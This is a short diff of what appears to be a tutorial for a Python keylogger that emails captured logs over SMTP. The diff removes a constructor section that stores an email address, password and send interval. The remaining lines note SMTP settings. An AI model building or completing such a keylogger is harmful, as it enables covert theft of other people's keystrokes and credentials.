@@ -15,16 +15,6 @@ import threading
 import smtplib
 ```
 
-# Constructor
-First email notification start keyloger
-```python
-def __init__(self, time_interval_send, email, password):
-    self.log = 'Keylogger started'
-    self.interval = time_interval_send
-    self.email = email
-    self.password = password
-```
-
 # Explanation
 Settings may differ from preference and SMTP. Server
 Debuglevel -> False, Turns on when debugging a program
